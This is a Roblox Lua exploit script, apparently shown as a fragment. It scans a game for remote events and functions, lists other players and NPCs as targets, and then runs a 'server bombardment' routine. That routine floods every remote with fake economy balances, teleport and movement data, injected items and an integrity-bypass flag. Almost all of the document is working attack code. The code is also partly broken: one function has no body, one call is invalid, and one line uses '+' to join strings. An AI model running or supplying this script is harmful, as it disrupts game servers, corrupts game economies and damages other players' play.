local function Log(msg)

local function SafeCall(func)
    if not Config.Active then return false end
    local success = pcall(func)
    if success then
        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
    end
    return success
end

-- CORE LAYER 1: DISCOVERY, GROUPS & LOCATION EXPLORATION ENGINE
-- ============================================================================
local function ScanWorldAndGroups()
    Log("Executing Deep World, Location, and Group Discovery...")
    
    Cache.TouchEvents = {}
    Cache.AllRemoteEvents = {}
    Cache.UnreliableRemotes = {}
    Cache.RemoteFunctions = {}
    Cache.ReplicatedHoldings = {}
    Cache.SpatialContainers = {}
    Cache.PhysicsConstraints = {}
    Cache.ValueTreats = {}
    Cache.HighValueItems = {}
    Cache.EcosystemContainers = {}
    Cache.TaggedInstances = {}
    Cache.DiscoveredGroups = {}
    Cache.WorldExplorationNodes = {}
    
    local rootLocations = {
        Services.ReplicatedStorage,
        Services.ReplicatedFirst,
        Services.JointsService,
        Services.Workspace,
        Services.Players,
        Services.StarterGui,
        Services.Lighting,
        Services.SoundService,
        Services.Teams,
        Services.TextChatService,
        Services.Chat
    }
    
    for _, location in ipairs(rootLocations) do
        pcall(function()
            for _, obj in ipairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(Cache.AllRemoteEvents, obj)
                    local nameLower = obj.Name:lower()
                    if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
                       nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
                       nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
                       nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
                       nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
                       nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") then
                        table.insert(Cache.TouchEvents, obj)
                    end
                elseif obj.ClassName == "UnreliableRemoteEvent" then
                    table.insert(Cache.UnreliableRemotes, obj)
                    table.insert(Cache.AllRemoteEvents, obj)
                elseif obj:IsA("RemoteFunction") then
                    table.insert(Cache.RemoteFunctions, obj)
                end
                
                if obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
                    table.insert(Cache.ValueTreats, obj)
                end
                
                if obj:IsA("Tool") or obj:IsA("Accessory") then
                    table.insert(Cache.HighValueItems, obj)
                end
                
                -- Group and Folder Identification
                if obj:IsA("Folder") or obj:IsA("Model") then
                    local nameL = obj.Name:lower()
                    if nameL:find("group") or nameL:find("team") or nameL:find("faction") or nameL:find("guild") then
                        table.insert(Cache.DiscoveredGroups, obj)
                    elseif nameL:find("zone") or nameL:find("region") or nameL:find("sector") or nameL:find("world") or nameL:find("map") then
                        table.insert(Cache.WorldExplorationNodes, obj)
                    end
                end
                
                if location == Services.Workspace and (obj:IsA("Folder") or obj:IsA("Model")) then
                    table.insert(Cache.SpatialContainers, obj)
                    table.insert(Cache.EcosystemContainers, obj)
                end

                if obj:IsA("Constraint") then
                    table.insert(Cache.PhysicsConstraints, obj)
                end
            end
        end)
    end
    
    pcall(function()
        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest", "GroupNode"}
        for _, tag in ipairs(commonTags) do
            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
                table.insert(Cache.TaggedInstances, taggedObj)
            end
        end
    end)
    
    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
    Cache.Stats.NodesExplored = #Cache.WorldExplorationNodes + #Cache.DiscoveredGroups
    Log(string.format("Discovery Complete: %d Remotes, %d Groups, %d World Nodes Resolved.", 
        #Cache.AllRemoteEvents, #Cache.DiscoveredGroups, #Cache.WorldExplorationNodes))
end

local function ScanTriggerParts()
    Cache.TriggerParts = {}
    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            local name = obj.Name:lower()
            if name:find("trip") or name:find("trigger") or name:find("touch") or 
               name:find("seat") or name:find("button") or name:find("lever") or 
               name:find("zone") or name:find("teleport") or name:find("damage") or 
               name:find("kill") or name:find("switch") or name:find("pad") or
               name:find("portal") or name:find("shop") or name:find("chest") or
               name:find("loot") or name:find("quest") or name:find("checkpoint") or
               obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
               obj:FindFirstChildOfClass("ProximityPrompt") then
                table.insert(Cache.TriggerParts, obj)
            end
        end
    end
end

-- CORE LAYER 2: TARGET & MOVEMENT FEEDBACK RESOLUTION ENGINE
-- ============================================================================
local function GetOtherPlayersAndEntities()
    Cache.OtherPlayers = {}
    Cache.NPCs = {}
    
    if Config.TargetAllPlayers then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local char = player.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                
                if hrp and humanoid then
                    local playerData = {
                        Player = player,
                        Character = char,
                        HRP = hrp,
                        Humanoid = humanoid,
                        Head = char:FindFirstChild("Head"),
                        Backpack = player:FindFirstChild_Or_Add and player:FindFirstChild("Backpack") or player:FindFirstChild("Backpack"),
                        Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
                        Parts = {}
                    }
                    
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Tool") then
                            table.insert(playerData.Parts, part)
                        end
                    end
                    table.insert(Cache.OtherPlayers, playerData)
                end
            end
        end
    end
    
    if Config.TargetNPCs then
        local npcContainers = {Services.Workspace, Services.Workspace:FindFirstChild("NPCs"), Services.Workspace:FindFirstChild("Mobs")}
        for _, container in ipairs(npcContainers) do
            if container then
                for _, npc in ipairs(container:GetDescendants()) do
                    if npc:IsA("Model") and npc ~= LocalPlayer.Character then
                        local hrp = npc:FindFirstChild("HumanoidRootPart")
                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
                        if hrp and humanoid then
                            table.insert(Cache.NPCs, {Character = npc, HRP = hrp, Humanoid = humanoid})
                        end
                    end
                end
            end
        end
    end
    
    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
    return Cache.Stats.PlayersAffected
end

-- CORE LAYER 3: ADVANCED PAYLOAD, FALSE DATA & MOVEMENT SIMULATOR
-- ============================================================================
local function ExecuteServerBombardmentPayload()
    if not Config.Active then return 0 end
    
    local fireCount = 0
    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
    
    local allTargets = {}
    if Config.TargetAllPlayers then
        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
    end
    if Config.TargetNPCs then
        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
    end
    
    local syntheticItem = Cache.SyntheticItemsPool[math.random(1, #Cache.SyntheticItemsPool)]
    local explorationNode = Cache.WorldExplorationNodes[math.random(1, math.max(1, #Cache.WorldExplorationNodes))]
    local groupNode = Cache.DiscoveredGroups[math.random(1, math.max(1, #Cache.DiscoveredGroups))]
    
    -- Constructing high-entropy false data & state objects
    local falseDataPayload = {
        syntheticItemToken = syntheticItem,
        worldExplorationTarget = explorationNode and explorationNode.Name or "GlobalSector",
        groupContext = groupNode and groupNode.Name or "DefaultFaction",
        falseEconomyBalance = math.random(999999, 999999999),
        simulatedMovementVector = Vector3.new(math.random(-5000, 5000), math.random(0, 1000), math.random(-5000, 5000)),
        simulatedCFrameMatrix = CFrame.new(math.random(-10000, 10000), math.random(100, 500), math.random(-10000, 10000)),
        timestamp = os.clock(),
        integrityCheckBypass = true,
        serverFloodBuffer = string.rep("FALSE_DATA_STREAM_NODE_", 16)
    }

    for _, remote in ipairs(Cache.AllRemoteEvents) do
        if not Config.Active then break end
        
        -- Fire false information, exploration data, and movement feedback
        task.defer(function()
            if not Config.Active then return end
            SafeCall(function()
                remote:FireServer("WorldExplorationSync", falseDataPayload, syntheticItem, explorationNode)
                fireCount = fireCount + 1
            end)
            SafeCall(function()
                remote:FireServer("CharacterMovementFeedback", {
                    position = falseDataPayload.simulatedMovementVector,
                    cframe = falseDataPayload.simulatedCFrameMatrix,
                    action = "TeleportSync",
                    velocity = Vector3.new(9999, 9999, 9999)
                }, groupNode)
                fireCount = fireCount + 1
            end)
            SafeCall(function()
                remote:FireServer("FalseItemInjection", syntheticItem, falseDataPayload.falseEconomyBalance, {verified = false})
                fireCount = fireCount + 1
            end)
        end)
        
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            task.defer(function()
                if not Config.Active then return end
                SafeCall(function()
                    remote:FireServer(target.HRP, "SimulatedAction", falseDataPayload)
                    fireCount = fireCount + 1
                end)
            end)
        end
    end
    
    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
        if not Config.Active then break end
        task.defer(function()
            if not Config.Active then return end
            SafeCall(function()
                remoteFunc:InvokeServer("RequestFalseStateValidation", falseDataPayload, syntheticItem)
                fireCount = fireCount + 1
            end)
        end)
    end
    
    return fireCount
end

function GUI.UpdateStats()

    GUI.RemoteStat.Text = string.format("📡 Remotes: %d", #Cache.AllRemoteEvents)
    GUI.GroupStat.Text = string.format("🛡️ Groups/Nodes: %d", #Cache.DiscoveredGroups + #Cache.WorldExplorationNodes)
    GUI.TargetStat.Text = string.format("👥 Targets: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
    
    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
                     tostring(Cache.Stats.TotalFired)
    
    GUI.FiredStat.Text = "💥 Fired: " + formatted -- Lua concatenation safety
    GUI.FiredStat.Text = "💥 Fired: " .. formatted
end
